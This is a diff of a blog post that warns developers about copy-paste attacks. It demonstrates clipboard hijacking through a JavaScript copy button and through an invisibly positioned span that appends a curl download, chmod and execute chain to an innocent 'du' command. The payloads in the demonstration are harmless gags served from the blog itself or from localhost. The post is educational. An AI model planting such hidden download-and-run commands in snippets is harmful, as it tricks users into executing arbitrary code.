@@ -1,6 +1,7 @@
 ---
 layout: post
 emoji: 🗒️
+asset: "/assets/posts/dont-trust-your-clipboard"
 ---
 
 Software engineers often tease about their non-technical friends or family getting a virus or malware because they downloaded a malice email attachment. The irony is individuals who make fun of these people participate in a dangerous activity every day that could result is something much worst ... copying and pasting.
@@ -17,8 +18,8 @@ Now lets explore some examples!
 I would hope most people, who code,  would understand this one. If you don't understand what a command is doing then don't run said command. The git gist by `frankbi` is one of my favorite examples of why you should not run copy and paste commands from websites.
 
 <div style="text-align: center;">
-    <img style="max-width: 100%;" src="/assets/images/rickrollbashcode.png">
-    <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
+    <img style="max-width: 100%;" src="{{ page.asset }}/rickrollbashcode.png">
+    <img style="max-width: 100%;" src="{{ page.asset }}/rickroll.gif"/>
 </div>
 
 While this rickroll seems harmless the arbitrary execution of code on your computer is something that should always make you nervous.
@@ -28,70 +29,13 @@ While this rickroll seems harmless the arbitrary execution of code on your compu
 While the pervious example is a _"no duh sherlock"_ the copy button is a bit let obvious. What is less obvious is the copy button which purpose to save you the backbreaking task of highlighting and `ctrl + c` or `right click <copy>` the text itself. The place I most often encounter the copy button is github's clone repo section.
 
 <div style="text-align: center;">
-  <img style="max-width: 65%;" src="/assets/images/githubclone.png"/>
+  <img style="max-width: 65%;" src="{{ page.asset }}/githubclone.png/totallysafeandhelpful.css">
 </div>
 
 Lets go to visit a sample blog post written by someone with nefarious intentions.
 
-<style>
-  #totallysafeandhelpful {
-    border: 1px solid;
-    padding: 10px;
-    box-shadow: 2px 4px #888888;
-    margin: auto;
-    max-width: 88%;
 
-  }
-
-  .code {
-    background: #f4f4f4;
-    border: 1px solid #ddd;
-    border-left: 5px solid #606060;
-    color: #1b1b1b;
-    page-break-inside: avoid;
-    font-family: monospace;
-    font-size: 15px;
-    line-height: 0.5;
-    max-width: 100%;
-    overflow: auto;
-    padding: 0.75em 1.8em;
-    display: block;
-    word-wrap: break-word;
-    overflow: auto;
-    margin-top: 5px
-  }
-
-  .nocopy {
-    -webkit-user-select: none;
-    -webkit-touch-callout: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    user-select: none;
-  }
-
-  .code1 {
-    padding: 0.05em 1em;
-  }
-
-  button {
-      font-size: 18px;
-      padding: 4px;
-  }
-
-  table, th, td {
-    border-collapse: collapse;
-  }
-
-  .button:hover span {
-    display:none
-  }
-
-  .button:hover:before {
-    content:"😈";
-  }
-
-</style>
-
+<link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">
 
 <div id="totallysafeandhelpful">
   <h3>Welcome to totally-safe-and-helpful.blog</h3>
@@ -108,13 +52,14 @@ Lets go to visit a sample blog post written by someone with nefarious intentions
       </div>
       </td>
   </table>
+    <br>
 </div>
 
 <script>
 function nefariousCopy(n) {
   var dummy = document.createElement("textarea");
   document.body.appendChild(dummy);
-  dummy.textContent = `curl -L ${window.location.host}/assets/images/ghostbusters \n`;
+  dummy.textContent = `curl -L ${window.location.host}{{ page.asset }}/ghostbusters \n`;
   dummy.select();
   document.execCommand("copy");
   document.body.removeChild(dummy);
@@ -124,14 +69,16 @@ function nefariousCopy(n) {
 Oh `BadActor666` has the docker command I was looking for and it can easily copy & paste it into my terminal. 
 
 <div style="text-align: center;">
-    <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
+    <img style="max-width: 100%;" src="/assets/posts/dont-trust-your-clipboard/rickroll.gif"/>
 </div>
 
-The copy button is not a pattern found on most coding websites, it is more of a novelty, but now look at something that is everywhere and everyone does.
+* https://zoomadmin.com/HowToInstall/UbuntuPackage/netsurf
+* https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html
+* https://learn.hashicorp.com/tutorials/nomad/get-started-install?in=nomad/get-started
+* https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html
+* https://www.oracletutorial.com/oracle-administration/oracle-list-users/
 
 ## Normal Select, Copy & Paste
-
-# https://learn.hashicorp.com/tutorials/nomad/get-started-install?in=nomad/get-started
 
 One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.  
 
@@ -145,7 +92,7 @@ Now lets go back to Look at another post from  totally-safe-and-helpful.blog ...
   Today we are going to explore how to find the files taking up all your harddisk space using the `du` command.
 
   <br><br>
-  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L http://127.0.0.1:4000/assets/images/sl --output sl; chmod +x sl; ./sl; clear;<br>>du -hs * </span> | sort -rh | head -5</div>
+  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L http://127.0.0.1:4000/{{ page.asset }}/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>
   <br>
 </div>
 
@@ -165,12 +112,12 @@ You see where this is going.
     <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
 </div>
 
-## Worst Case Scenario
+## Worst Case Scenarios
+
 
 ### Social Engineering
 
-
-### The Attack
+#### The Attack
 ```
 sudo apt install -yq curl gnupg2 ca-certificates lsb-release
 sudo apt-get -yq update
@@ -178,7 +125,9 @@ sudo apt install -yq nginx
 sudo systemctl start nginx
 ```
 
-## Why the Disclaimer
+### Compromising a Blog
+
+## Why the Disclaimer?
 
 This could be a blog post by itself and it might be some day, but here is the cliff notes version. Like many apps, share library, blogs this sites code is in a GitHub repo. When using someone else code or viewing a website you are trusting them to secure there code and prevent others from making changes.
 
@@ -187,9 +136,16 @@ Do you know how strong my password is for my github? Do you know if I have MFA s
 yep … the internet sucks.
 
 
-## You Scared? Good! Now what?
 
-### ZSH
+## You Scared?
 
-### Tilix
+### NO?
+You could argue I am being paranoid, and how often does this really happen. And you are missing the point. We should be doing thought experiments on how would you circumvent security or trick users because that is what keeps us vigilant. Plus it only take one miss step and you are the reason your company is compromised. Some paranoid is a good thing to have in the software discipline.
+
+### Good! Now What?
+
+
+#### ZSH
+
+#### Tilix
 
